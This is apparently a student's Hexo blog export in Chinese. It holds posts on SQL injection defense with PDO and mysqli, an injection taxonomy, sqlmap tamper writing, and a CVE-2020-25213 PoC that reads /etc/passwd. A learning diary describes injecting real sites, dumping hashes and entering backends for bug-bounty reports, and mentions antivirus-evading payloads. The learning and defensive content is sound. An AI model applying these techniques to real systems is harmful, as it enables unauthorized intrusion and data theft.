variables like &#39;general%&#39; 查看日志是否开启，和日志保存的路径</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    $dsn &#x3D; &#39;mysql:dbname&#x3D;security&#39;;</span><br><span class="line">    $userName &#x3D; &#39;root&#39;;</span><br><span class="line">    $passWord &#x3D; &#39;root&#39;;</span><br><span class="line">    $conn &#x3D; new PDO($dsn,$userName,$passWord);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; PDO参数</span><br><span class="line">$conn-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,false); &#x2F;&#x2F; 启用或禁用预处理语句的模拟，防止宽字节注入</span><br><span class="line">$conn-&gt;setAttribute(PDO::ATTR_ERRMODE,false);         &#x2F;&#x2F; 错误报告，防止报错注入</span><br><span class="line">&#x2F;&#x2F; $conn-&gt;setAttribute(PDO::MYSQL_ATTR_MULTI_STATEMENTS,false); &#x2F;&#x2F;多语句查询,防止堆叠查询，union查询在一定条件下可以绕过</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置编码</span><br><span class="line">&#x2F;&#x2F; $conn-&gt;query(&quot;set names gbk&quot;); </span><br><span class="line">   $conn -&gt;query(&quot;set names utf-8&quot;);</span><br><span class="line">&#x2F;&#x2F; 测试宽字节注入，原理就是把转义的反斜杠吃掉，将想要拼接的sql语句从参数中逃逸出来。</span><br><span class="line">&#x2F;&#x2F; mysql&gt; SELECT &#96;username&#96;,&#96;password&#96; FROM &#96;users&#96; WHERE &#96;id&#96; &#x3D; &#39;3  SAFAAND 9&#39;;</span><br><span class="line">&#x2F;&#x2F; 实际执行效果:</span><br><span class="line">&#x2F;&#x2F; SELECT &#96;username&#96;,&#96;password&#96; FROM &#96;users&#96; WHERE &#96;id&#96; &#x3D; &#39;3&#39;;</span><br><span class="line">&#x2F;&#x2F; mysql在查询的时候只获取第一个字符串，如果后面的字符串之间有空格，则忽略后面的所有字符。</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;创建预处理sql语句</span><br><span class="line">    $sql &#x3D; &quot;SELECT &#96;username&#96;,&#96;password&#96; FROM &#96;users&#96; WHERE &#96;id&#96; &#x3D; ? &quot;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 执行预处理sql语句，创建一个PDOstatement</span><br><span class="line">    $pdoStmt &#x3D; $conn -&gt; prepare($sql);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 绑定参数</span><br><span class="line">    $id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">    $pdoStmt-&gt;bindParam(1,$id,PDO::PARAM_INT);</span><br><span class="line">    $pdoStmt-&gt;execute([$id]);</span><br><span class="line"></span><br><span class="line">    while($row &#x3D; $pdoStmt-&gt;fetch(PDO::FETCH_ASSOC)) &#123;</span><br><span class="line">        echo &#39;&lt;pre&gt;&#39;;</span><br><span class="line">        print_r($row);</span><br><span class="line">echo &quot;id &#x3D; $id&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; catch(PDOException $e) &#123;</span><br><span class="line">    print &quot;Connect ERROR&quot;.$e-&gt;getMessage();</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="2-通过mysqli防御"><a href="#2-通过mysqli防御" class="headerlink" title="2.通过mysqli防御"></a>2.通过mysqli防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$mysqli &#x3D; new mysqli(&quot;localhost&quot;,&#39;root&#39;,&#39;root&#39;,&#39;security&#39;);</span><br><span class="line"></span><br><span class="line">if($mysqli -&gt; connect_error) </span><br><span class="line">&#123;</span><br><span class="line">    die($mysqli-&gt;connect_error);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; create a predefined object and get a position</span><br><span class="line"></span><br><span class="line">$sql &#x3D; &quot;SELECT username,password FROM users WHERE id &#x3D; ?&quot;;</span><br><span class="line">$mysqli_stmt &#x3D; $mysqli-&gt;prepare($sql);</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;bind param</span><br><span class="line">&#x2F;&#x2F; stmt &#x3D;&gt; stagement</span><br><span class="line">&#x2F;&#x2F; bind_param(&quot;&lt;参数类型[i(int),s(string),d(double)]&gt;&quot;,$para0,$para1,$para2...)</span><br><span class="line">$mysqli_stmt-&gt;bind_param(&quot;i&quot;,$id);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;bind result</span><br><span class="line">$mysqli_stmt-&gt;bind_result($username,$password);</span><br><span class="line">$mysqli_stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">while($mysqli_stmt-&gt;fetch())</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;id&#x3D;$id,username&#x3D;$username,password&#x3D;$password&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli_stmt-&gt;close();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h3></li><li>只能说预编译的方法是防御sql注入最好的方式，但是主要还是看编写代码的人，即使用预编译也有人会写出存在sql注入的代码。</li><li>今天我也是研究了一天，从基础的注入攻击，再到如何防御。php代码是我自己写的，就是自己写存在漏洞的php代码，再去测试和研究，以前都是做别人的靶场，代码层面理解不到位，现在算是回来恶补吧。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>学习_生活记录_再探sql注入_sqlmap使用 &amp; tamper编写</title>
      <link href="2022/04/26/%E5%AD%A6%E4%B9%A0_%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95_%E5%86%8D%E6%8E%A2sql%E6%B3%A8%E5%85%A5/"/>
      <url>2022/04/26/%E5%AD%A6%E4%B9%A0_%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95_%E5%86%8D%E6%8E%A2sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h1><p>&ensp;&ensp;&ensp;&ensp;以前学sql注入，sqli-lab也做完了，该回的操作都会，就是没有系统的去总结，或者说虽然有写思维导图但是没完全入脑，所以重新回来复习基础。<br>###按照注入点分类</p><ul><li>数字型</li><li>字符型</li><li>搜索型<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1</span><br><span class="line">SELECT * FROM 表名 WHERE 字段 LIKE &#39;%关键字%&#39; </span><br></pre></td></tr></table></figure>###按照提交的方式分类</li><li>GET</li><li>POST</li><li>cookie注入(其实也可以算作http头部注入)</li><li>http头部注入(Referer,User-Agent等等)</li></ul><p>###按照注入的效果分类</p><ul><li>基于布尔的盲注</li><li>基于时间的盲注</li><li>报错注入</li><li>联合查询注入</li><li>堆叠注入(一次性注入多条sql语句,用;做分隔)</li><li>宽字节注入(GBK编码导致的两个字符组成一个中文，从而从而绕过字符转义的防御措施)</li></ul><p>##相关基础知识</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">MySQL一库三表</span><br><span class="line">information_schema</span><br><span class="line">    </span><br><span class="line">    schemata 存放所有创建的数据库名</span><br><span class="line">        schema_name 数据库名字段</span><br><span class="line">    </span><br><span class="line">    tables   存放所用的库名和表名</span><br><span class="line">        table_schema 数据库名字段</span><br><span class="line">        table_name 表名字段</span><br><span class="line">    </span><br><span class="line">    columns</span><br><span class="line">        table_schema </span><br><span class="line">        table_name   </span><br><span class="line">        columns_name 字段名</span><br><span class="line"></span><br><span class="line">mysql注入常用到的函数</span><br><span class="line">    load_file()</span><br><span class="line">    length()</span><br><span class="line">    substr(string,start,length)</span><br><span class="line">    mid() 同 substr()</span><br><span class="line">    concat()      </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="sqlmap-Tamper"><a href="#sqlmap-Tamper" class="headerlink" title="sqlmap Tamper"></a>sqlmap Tamper</h1><ul><li><p>&ensp;&ensp;&ensp;&ensp;又重温了一下Tamper的编写。之前学习tamper编写，用的是绕过安全狗的例子。现在python学的比较好了，就去研究了自带的tamper的代码，大部分还是懂的，**kwargs和函数下嵌套函数去学习了下，感觉还是非常有收获。不过，一些正则的写法属实是看的有些迷糊，得查语法才能完全看懂。总的来说，现在别人写的Tamper看的懂了，自己也能写tamper了，re这个模块主要是我在学爬虫的时候用过，现在使用也是没有什么问题，主要就是正则表达式，其实基本的还是会的，就是有一些语法记不住。再说说我学习的方式，以前是跟着视频学，现在是看书(《web安全攻防》，挺好的一本书，实战性强)自己研究探索，对比来说，我觉得自己看书学比较适合我。</p></li><li><p>&ensp;&ensp;&ensp;&ensp;好了，再说一下英语四级的学习，感觉计划得调整一下，之前是有一点着急了，事情做的有效才是最关键的。以后看情况再写文章了，我感觉心态调整的差不多了。</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>学习&amp;生活_再探poc的编写</title>
      <link href="2022/04/25/%E5%AD%A6%E4%B9%A0-%E7%94%9F%E6%B4%BB-%E5%86%8D%E6%8E%A2poc%E7%9A%84%E7%BC%96%E5%86%99/"/>
      <url>2022/04/25/%E5%AD%A6%E4%B9%A0-%E7%94%9F%E6%B4%BB-%E5%86%8D%E6%8E%A2poc%E7%9A%84%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h3 id="poc编写"><a href="#poc编写" class="headerlink" title="poc编写"></a>poc编写</h3><p>&ensp;&ensp;其实很早就开始学习写poc了,用的是pocsuite3这个框架， 不过都没有怎么深入的学习，框架还不是很熟悉，就是之前 跟着b站上的老师写了一个glassfish的任意文件读取漏洞，写的也是非常的粗糙。 这几天都在折腾poc，也就把之前写的glassfish的poc优化了一下，主要是windows和linux读取的文件不同，一个/etc/passwd, 一个是/windows/win.ini。同时，我也看了一下pocsuite开发文档，最大的收获是懂了result这个返回参数的用法(一开始接触时困扰我好久)。现在基本上可以自己编写_verify这个部分了，就是验证是否存在漏洞这个部分,不过_shell这个部分,一些反弹的操作的写法有空值得再去学一下。搞这些还不够，我还折腾了一下wordpress的file-manager插件漏洞(CVE-2020-25213),属于一个RCE漏洞，危害就懒得说了，很大就对了，说一下我编写poc的过程，一开始我是在searchsploit上看到这个漏洞的，poc是shell写的，我就准备先将shell的poc移植成python的,最后再移植到pocsuite3框架上。这个shell写的poc，我看懂思路之后，就很顺利的把poc写好了，不过上传文件这里忘记了就参考了一下别人的。我写好自己的poc之后就把它移植到pocsuite3上了，但是上传文件这里就是搞不定，就是验证存在漏洞之后，上传一个phoinfo就不会搞了，后面也是参考了一下别人在pocsuite框架上写的这个漏洞的poc，但是由于他的靶机是linux，我这里也无法getshell,也只能完成基本的验证。<br>最后，我还是放弃了在框架上getshell，我选择了自己写一个poc实现webshelll的模拟终端，以前上传了webshell都是用被人的webshell管理工具，现在总算是自己能实现模拟终端这个基本的功能了。</p><p>&ensp;&ensp;再说一下我的一些感想吧，上面写的有点乱。首先，验证漏洞是否存在可以有多种思路，比如存在RCE，直接尝试上传空白文件，如果可以请求到上传的文件就说明存在漏洞，或者根据一些特征文件或者页面错误参数确定存在漏洞的可能。接着就是漏洞挖掘方面的感悟，这几天研究poc的编写，虽然没有去研究代码层面的原理，但是我发现每一个漏洞的出现都是有踪迹可寻的，比如，一个人写的代码用了另一个人曾经有漏洞的代码，也就是说这两个漏洞之间的原理十分相似，我觉得这个思路可以用到新漏洞的挖掘当中去。</p><p>&ensp;&ensp;最后，再说说我大学里的学习，上面说的算是我兴趣使然的学习。大学里的课程是越学越没劲了，但是，我得想个办法让自己变得积极一些，比如，想想没学好的后果，想想学好的用处。还有，英语四级考试越老越近了，我最近似乎遇到了听力上的瓶颈，导致我做阅读也是越做越烦，算了，慢慢来吧！我才不管什么瓶颈，干的就是你！我觉得我在懈怠英语四级备考的时候得想想如果没有过的后果，给自己一点压力+戒骄戒躁，这样我觉得会状态会慢慢变好。</p><h3 id="插图的事情"><a href="#插图的事情" class="headerlink" title="插图的事情"></a>插图的事情</h3><p>&ensp;&ensp;由于这个插图实在是折腾人，其实有专门的插件，但是还要配置什么的，弄了一下，没搞好，我暂时放弃了，以后也不知道有没有空，有，再弄。上一篇的插图都是我改网页代码+亲自上传图片到github仓库才搞好的，我也是佩服我自己。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>学习_生活记录_windows下常用命令</title>
      <link href="2022/04/24/%E5%AD%A6%E4%B9%A0_%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95_windows%E4%B8%8B%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>2022/04/24/%E5%AD%A6%E4%B9%A0_%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95_windows%E4%B8%8B%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="新学的一些命令"><a href="#新学的一些命令" class="headerlink" title="新学的一些命令"></a>新学的一些命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">find &quot;test&quot; d:&#x2F;test&#x2F;test.txt 从一个文件中查找字符串</span><br><span class="line">dir|findstr &quot;.exe&quot; 列出当前目录下的exe文件</span><br><span class="line">Move-Item 移动文件夹</span><br><span class="line">Rename-Item 文件夹重命名    </span><br><span class="line">Copy-Item 复制文件</span><br><span class="line">where python 查找一个命令所在的路径</span><br><span class="line">$env:PATH 查看环境变量</span><br><span class="line">Get-ChildItem -Recurse -Filter &#39;*.exe&#39;  查找子目录下的exe文件 </span><br><span class="line">gci -r -fi &#39;*.exe&#39; 简写</span><br></pre></td></tr></table></figure><h3 id="一些简单的命令"><a href="#一些简单的命令" class="headerlink" title="一些简单的命令"></a>一些简单的命令</h3>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkdir                                   </span><br><span class="line">ls                                      </span><br><span class="line">shutdown</span><br><span class="line">dir</span><br><span class="line">type</span><br><span class="line">net user</span><br><span class="line">net localgroup</span><br><span class="line">tasklist</span><br><span class="line">systeminfo</span><br><span class="line">cd</span><br></pre></td></tr></table></figure><h3 id="当下所思所想"><a href="#当下所思所想" class="headerlink" title="当下所思所想"></a>当下所思所想</h3><p>今天，突然感觉自己有一些命令总是不会用，比如这个find，今天总算是会了，顺便学了一个findstr。<br>还有，我要作出一个决定，今后我每天只要有空就写一写博客，记录我的生活以及学习。</p><p>手机彻底摔坏了，这部手机差不多2020年12月买的吧！到现在才一年多，没办法，如果修得十几天，我还要上网课，所以就买了一部新的手机，1500左右的。</p><p>这篇文章算是我第一篇分享我学习内容的文章吧，以后也会分享我学web攻防的学习内容，这几天也是了解了一下护网和渗透测试的区别，我觉得最大的区别是需要内网渗透吧，护网更加深入，而普通的渗透可能没有那么深入，也就是点到为止的测试。</p><p>最后，插几张图片，这破碎的屏幕就如我的心一样，早就碎了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>谈谈我一年的web安全学习路程</title>
      <link href="2022/04/13/%E8%B0%88%E8%B0%88%E6%88%91%E4%B8%80%E5%B9%B4%E7%9A%84web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%A8%8B/"/>
      <url>2022/04/13/%E8%B0%88%E8%B0%88%E6%88%91%E4%B8%80%E5%B9%B4%E7%9A%84web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>本来不想写这段经历的，有很多原因吧，主要还是自己的原因。算了，不说废话了，切入正题。</li><li>说起我学web安全的历程，就得从2021年1月份左右了开始了。我在开始的时候，其实也是非常迷茫的，大学专业也不是我想学的，我其实最喜欢的专业是网络安全的，不过这专业没几个学校有，就算有，培养体系也不完善。一开始，我是在学C语言的过程中意外的对网络安全有了浓厚的兴趣，其实，一开始我想过用unity开发游戏，之前高考玩之后把C#的基础都学了一下，算是我入门的语言吧。不过我发现开发游戏似乎没有那么有意思，而且还难，我最后就放弃了，也就有了接下来网络安全之旅。</li><li>一开始学网络安全，我也不知道从哪里开始，所以在知乎上看文章，最后看到了拼客学院的陈老师的文章，我感觉他写的不错，没有什么束缚的感觉，就好像一股清流，他的文章让我知道了很多，也让我学网络安全有了方向。之后，也是在拼客学院里看kail的教程学习了几天，陈鑫杰老师讲课真的很用心的在解释，就好像心中有一团火一样，点燃了我，那几天我也是在深夜学的，一开始只是好奇，后面就无法自拔了，从讲互联网的诞生，到2017年的永恒之蓝，棱镜门事件，在到使用利用MS17-010 windows smb服务的漏洞渗透靶机，那时候我也是刚刚接触metasploit，也是一步一步照着做，最后看到电脑被打蓝屏了，哈哈哈哈哈，不过这是过头了，正常应该是反弹一个shell，不过那时候不懂，就是玩哈哈哈哈。那时候折腾的东西很多，进步的也快，每天都很充实，虽然有时候被linux的一些报错给整疯了，安装Nessus漏洞扫描器也是下了不少功夫才搞定，不过这都不算什么，只要心中有目标，还有自己觉得做这些是有意义的。这算是第一阶段(2021年一月到二月初)，大一上的寒假，那时候是一边准备着c语言二级考试，一边入门网络安全，这个阶段我大概清除了安全的几个方向，无线网络安全，工控安全，web安全，系统安全等等，也对渗透测试工程师的招聘要求有了大致的了解。</li><li>第二个阶段，2021年2月中旬就正式的开始学习网络安全了，课程是跟着b站千锋教育的，影响比较深的是杨哥哈哈哈哈，一开始教我网络基础，tcp/ip五层模型，路由器和交换机的工作原理，我感觉比现在我学校的计算机网络的老师讲的还详细和生动(我们老师应该看不到这篇文章吧嘻嘻)，还有域，vpn，防火墙，应用层的各种服务器(DHCP,DNS,FTP)和协议，也和我们讲了一些渗透的东西，关键是给了我们一个渗透测试标准PTES标准(清华大学诸葛建伟老师翻译的，后来也是读了他翻译的metasploit渗透测试指南和metasploit魔鬼训练营，教了我很多操作，开阔了我的视野，还有不得不说，诸葛老师真的也是心中有一团火的人，引领着我)。特别强调一下，我在学网络基础的时候，学到路由器交换机的时候，用到了一个思科的模拟软件，这个软件可以模拟网络中的各种设备，我也是跟着杨老师配置路由器和交换机组成基本的网络，ip route ,interface什么的路由器的命令，哈哈哈哈，真的是，我现在大学的计算机网络的课程实验不知道有没有这个，我看是没了，现在还在上网课，开学就大三，我真是乌鸦嘴，希望别是真的。学完了基础，也学了一点运维的东西，这时候接触了linux的centos,ubuntu系统，vim的基本使用，文件权限和日志这些。同时也快速入门了html，javascript以及pyhton。最后，我终于在3月底开始了web渗透的学习，信息收集，sql注入，xss，命令执行，文件上传，文件包含，ssrf，csrf，权限提升。不过这个阶段我感觉学的比较着急，学的不是太扎实，也就有了下一个阶段。这个阶段差不多就是在大一下学期。</li><li>第三个阶段，由于大一下的暑假比较拉跨，我玩了一个月，接下来一个月准备了一下计算机三级的信息安全(虽然真的没什么用哈哈哈)，所以这个阶段得从2021年9月开始(大二上)。我又在b站找了web安全的课程，把没学的骚操作给学了，这不，在10月到11月期间吧，我迷上了挖漏洞，我是在漏洞盒子上挖的公益SRC，技术还比较菜吧，只能搞一些中小站点，之前也发现过一个研究所的XSS，居然不给我过，自己却马上修复了。。。一开始是用google语法，手动测试sql注入和xss，后来觉得太慢了，也没什么技术提升，就想着怎么自动化了，后来有了连招，差不多就是，爬虫(一开始用别人的百度的，后来我在11月份把爬虫学了自己写了一个必应的爬虫)批量获取有漏洞特征的url，sqlmapapi自动扫描，还别说效率还挺高。不过最令我影响深刻的一个漏洞是一个律师事务所的站点，一开始我在登录页面，随意提交了admin ))# 发现居然报错了，我真的是笑死，居然还有这么菜的防护，sqlmap梭哈，不过奇怪居然拿不到数据，没办法，手工报错注入，我发现每次注入只能拿到一半的哈希值16位，一开始直接拿全部拿不全，我就意识到不对劲了，后来用了mid函数解决，解密了一下md5就进后台了，这时候我其实已经今后台进麻了(记得我第一个发现的漏洞就是弱口令进了一个后台好像就是在2021年的8下旬),后面看了一下，居然发现了前人的痕迹，网站有一个大马，后面发现网站禁用了php执行命令的所以函数，我也没什么思路提权那时候，就没搞了(蚁剑执行不了任何命令我是崩溃的),写了报告提交了上去。还有一次是进了一个协会的数据库，这个比较经典，思路是这样的，由于数据库比较多，sqlmap跑出好多密码我又不知到哪个是后台的密码，但是看到了一个mysql的数据库，索性就干它，后面也是顺利的拿到了密码，连上了数据库，我当时在宿舍笑了半天，哈哈哈哈哈。最后，在数据库里面找了一下，拿到了后台的密码进了后台，那时候比较菜也就没有继续搞它了。这个阶段也就是我初步有了挖漏洞的能力，但是我感觉还是少了一点什么，距离拿money的项目漏洞还有很长的路要走，说难也难，说简单也简单吧。多说一下，xxe最近学了一点，但是反序列化漏洞我现在还没怎么学，不过原理是懂的。额外补充，免杀这里我也折腾过一阵子，一开始是用别人的工具免杀了，go写的，后面我自己找资料学，用python也实现了metasploit生成ployload的免杀。</li><li>呜呼，一下子写了这么多，不知道会不会有很多废话，哈哈哈哈，总结一下，还是太菜，得继续学，继续实践。这一年的的规划是学java的代码审计以及巩固自己学的web漏洞多搭建环境复现，思考exp的思路(最近发现metasplit的exp有关web的我看的懂一些了，以后我也要用Ruby写exp，嘿嘿)。记得这么一句话，不是你的技巧不够多，而是你的基础不够牢。</li><li>“没有最强，只有更强！” “还有高手!”能看到我写这篇文章的人，与你们共勉吧！</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>当下的一些想法</title>
      <link href="2022/04/10/%E5%BD%93%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/"/>
      <url>2022/04/10/%E5%BD%93%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>好久没回来了，折腾了一些博客的评论系统，可惜没搞好，事与愿违吧！不过无所谓了，也没什么人会来评论。我写博客的目的也就是为了记录自己的生活，没别的。</p><p>我简要总结一下我的2021年吧！首先，计算机二级c语言和三级信息安全都过了，一个优秀，一个良好，都不难，说实话也没什么意思。我考证书的目的不是这个证书有用才去考，考证书的过程中学到的知识，我觉得才是有用的，也是对自己的一种历练吧！转眼现在到了2022年4月了，接下来还有两个月的时间准备英语四级，现在听力基本上复习完了，但是平均下来还是只能对13道左移，这可不行，我的目标是20，所以接下来是每天一套听力(7套，留了5套左右考前做，可能5套有点多，到时候看情况)，单词也就继续天天坚持背背就行了，重点关注听力和阅读，这两个35%要搞好，之后有空余时间再把作文和翻译搞好。其它的计划就不说了，多说无益，现在就一个目标，把英语四级考好。多说一句，对于我而言，我计划的越周密，反而执行力越差，但是，如果给我一个大概的计划，我的执行力反而更强，也坚持的越久。</p><p>最后，说一下，2021年10月从微电子专业转专业到了网络工程，还是比较顺利的，大二第一个学期补了7课，其中有三门是要考试的，也还好，都过了。现在这学期，还有两门实验课要补，压力也是小了一点。不过，最近学计算机组成原理还是有些懈怠了，而且由于疫情愈发严重，可能最后要网上考试了，开学就大三也不是没有可能，所以自己懈怠的课程得开始慢慢补上来了。</p><p>“最初的梦想绝对会到达，实现了真的渴望，才能够算到过了天堂”,希望自己能一直坚持下去,虽然有时候，真的，真的，心累了。</p><p>– 就说这么多吧，下次写博客也不知道什么时候了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>二级c语言的学习生活</title>
      <link href="2021/01/24/%E6%88%91%E7%9A%84%E4%BA%8C%E7%BA%A7c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/01/24/%E6%88%91%E7%9A%84%E4%BA%8C%E7%BA%A7c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>现在在学习c语言，准备今年3月27号的计算机二级考试，知乎上的人都说二级刷刷题库就能过，没什么意思🤦‍。最近我也做了一些章节的练习，感觉题目比较基础，考察对一些细节的理解的时候，我老是被坑。。。总的来说感觉还行。现在也学了一半了，我争取在2月14号左右结束二级所有知识的学习，之后进行上机练习，还要看一些二级的公共基础知识，时间感觉还挺充裕的23333。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>建博客时的一些想法</title>
      <link href="2021/01/21/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>2021/01/21/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<p>本站建于2021年1月20日，一时兴起折腾了好久才搞好，网站是借用Github上hexo的博客模板，还有一些设置没改，也不会改。以后学习了前端的html,css之后再回来折腾吧。人活着在于折腾，哈哈哈哈。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
